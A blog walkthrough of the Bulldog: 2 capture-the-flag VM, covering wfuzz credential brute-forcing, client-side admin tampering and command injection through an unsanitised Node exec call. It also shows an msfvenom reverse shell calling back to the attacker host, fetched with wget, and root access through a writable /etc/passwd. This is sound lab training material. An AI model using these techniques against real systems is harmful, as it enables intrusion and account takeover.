---
layout: post
date: 2018-08-09 22:23:08 +0000
last_modified_at: 2018-08-10 06:42:40 +0000
title: "Bulldog: 2 Walkthrough"
subtitle: The Reckoning
category: Walkthrough
tags: [VulnHub, Bulldog]
comments: true
image:
  feature: bulldog-2-walkthrough.jpg
  credit: ivanovgood / Pixabay
  creditlink: https://pixabay.com/en/french-bulldog-dog-smart-look-gerda-1417248/
---

This post documents the complete walkthrough of Bulldog: 2, a boot2root [VM][1] created by [Nick Frichette][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Three years have passed since Bulldog Industries suffered severe data breaches. In that time, they have recovered and re-branded as **Bulldog.social**, an up and coming social media company. Can you take on this new challenge and get `root` on their production web server?

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 nginx 1.14.0 (Ubuntu)
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Bulldog.social
```

Looks like only `80/tcp` is open. Here's how the site looks like.

![Bulldog.social](/assets/images/posts/bulldog-2-walkthrough/ad2442dc.png)

# Angular

The site is running on Angular (4.4.7), at least the client-side of the site is. You can see the Angular favicon on the tab.

![favicon.ico](/assets/images/posts/bulldog-2-walkthrough/7ca76709.png)

Another way of determining if the site is running Angular—is by looking at the DOM tree. The DOM tree is dynamically built by Angular through the use of JavaScript (or TypeScript at the server side). There's no point to looking at the HTML source because you won't find anything useful there other than the bundled JavaScript files. Mind you, these minified files make analysis a little more difficult than usual, but you can always use the browser's JavaScript debugger to prettify them.

![DOM Tree](/assets/images/posts/bulldog-2-walkthrough/f448f633.png)

The login page is available to us as the sole attack surface, but where are the usernames?

![Login Page](/assets/images/posts/bulldog-2-walkthrough/5b74e970.png)

Turns out that there's a `/users/getUsers` route hidden in `main.js`.

![getUsers](/assets/images/posts/bulldog-2-walkthrough/7a49aeb2.png)

```
# curl -s 192.168.30.128/users/getUsers | jq . | grep username | wc -l
15760
```

The site is not lying when they say they have over 15,000 users!

Using `wfuzz` and a wordlist of the 100 most common passwords, we can attempt a brute-force at the login page like so.

```
# wfuzz \
-w usernames.txt \
-w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
-H "Content-Type: application/json" \
-H "Referer: http://192.168.30.128/login" \
-d "{\"username\":\"FUZZ\", \"password\": \"FUZ2Z\"}" \
-t 20 \
--hc 401 \
http://192.168.30.128/users/authenticate
```

In fact, we don't even have to finish the brute-force.

```
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.30.128/users/authenticate
Total requests: 1576000

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000206:  C=200      0 L	       3 W	    445 Ch	  "eivijay - 12345"
000405:  C=200      0 L	       3 W	    459 Ch	  "ipadolpho - 123456789"
000704:  C=200      0 L	       3 W	    454 Ch	  "mdrudie - qwerty"
000916:  C=200      0 L	       3 W	    464 Ch	  "nmmyriam - letmein"
001603:  C=200      0 L	       3 W	    447 Ch	  "nswash - 12345678"
001801:  C=200      0 L	       3 W	    462 Ch	  "pejerrine - 123456"
```

Logging in with any of the credentials above will result in a JSON Web Token (JWT) and the user's profile getting stored in the browser's local storage. You'll see that in a while.

Let's go with the credential (`eivijay:12345`).

![eivijay](/assets/images/posts/bulldog-2-walkthrough/5537bc42.png)

Here's the local storage. The stored items are: `id_token` and `user`.

![Local Storage](/assets/images/posts/bulldog-2-walkthrough/b0fbc009.png)

Somewhere in `main.js` lies the function (aptly called `isAdmin`) to determine if a user is admin.

![isAdmin](/assets/images/posts/bulldog-2-walkthrough/ca5357ae.png)

A user is admin as long as the user's authentication level is `master_admin_user`. Let's change the authentication level for `eivijay`.

![master_admin_user](/assets/images/posts/bulldog-2-walkthrough/e8ddb299.png)

Refreshing the profile page brings out the **Admin Dashboard** route.

![Dashboard](/assets/images/posts/bulldog-2-walkthrough/4cc20ae3.png)

```
# wfuzz \
-w /usr/share/wordlists/rockyou.txt \
-H "Content-Type: application/json" \
-H "Referer: http://192.168.30.128/dashboard" \
-d "{\"username\":\"admin\", \"password\": \"FUZZ\"}" \
-t 20 \
--hh 40 \
http://192.168.30.128/users/linkauthenticate
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.30.128/users/linkauthenticate
Total requests: 14344392

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

023194:  C=400     10 L	      60 W	   1061 Ch	  "!"£$%^"
037686:  C=200      0 L	       2 W	     40 Ch	  "foreverfriends"^C
Finishing pending requests...
```

I wasted plenty of CPU cycles here trying to brute-force the second login. But, at least it brought me closer to the next stage. Notice when the password contains a double quote (`"`), the response code is `400` and the response length is more than 1000 bytes? This prompted me to investigate further.

Using **Burp Suite**, I was able to reproduce the `400` response.

![Request](/assets/images/posts/bulldog-2-walkthrough/daed6699.png)

Turns out that the JSON parser produces a syntax error when it's given a malformed JSON input.

![Response](/assets/images/posts/bulldog-2-walkthrough/3a7cfbd7.png)

### Bulldog 2 - The Reckoning

Not knowing how to proceed, I chanced upon the site's Github [respository](https://github.com/Frichetten/Bulldog-2-The-Reckoning) searching for **"Bulldog-2-The-Reckoning"** in Google.

You can see what happens at the `/linkauthenticate` route—the password field is not sanitized before passing on to `exec`.

<div class="filename"><span>user.js</span></div>
```js
router.post('/linkauthenticate', (req, res, next) => {
  const username = req.body.password;
  const password = req.body.password;

  exec(`linkplus -u ${username} -p ${password}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.log(`stderr: ${stderr}`);
});
```

### Low-Privilege Shell

Armed with this knowledge, we can make use of command substitution to execute shell commands through the password field.

First, let's see if we can execute `wget`.

![wget](/assets/images/posts/bulldog-2-walkthrough/6f373de8.png)

Awesome. `wget` is available and it's running 64-bit.

![x86_64](/assets/images/posts/bulldog-2-walkthrough/8e106f77.png)

```
# echo -n 7838365f36340a | xxd -p -r
x86_64
```

Next, we can generate a 64-bit reverse shell with `msfvenom`.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.30.129 LPORT=4444 -f elf -o rev
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

Transfer the reverse shell over to `/tmp/rev` with `wget`.

![/tmp/rev](/assets/images/posts/bulldog-2-walkthrough/82ace33e.png)

Make it executable with `chmod +x /tmp/rev`.

![chmod](/assets/images/posts/bulldog-2-walkthrough/6b361696.png)

Let's execute the reverse shell.

![rev](/assets/images/posts/bulldog-2-walkthrough/350d341f.png)

Boom. We got shell.

![shell](/assets/images/posts/bulldog-2-walkthrough/9357fbe0.png)

Now that we have a low-privilege shell, let's spawn a pseudo-tty with Python.

![TTY](/assets/images/posts/bulldog-2-walkthrough/985251ca.png)

### Privilege Escalation

I found my ticket to privilege escalation during enumeration of this account.

![/etc/passwd](/assets/images/posts/bulldog-2-walkthrough/d2911140.png)

Since we have write permissions to `/etc/passwd`, let's change the `root` password to `root`.

![root](/assets/images/posts/bulldog-2-walkthrough/84537774.png)

### Where's the Flag (WTF)

Getting the flag is trivial now that I'm `root`.

![Flag](/assets/images/posts/bulldog-2-walkthrough/23aa1596.png)

:dancer:

### Afterthought

Who would have thought that the MEAN stack is so cool? I certainly didn't know anything about it until I tried my hands on this VM. Kudos to Nick for creating it!

[1]: https://www.vulnhub.com/entry/bulldog-2,246/
[2]: https://twitter.com/@frichette_n
[3]: https://www.vulnhub.com/
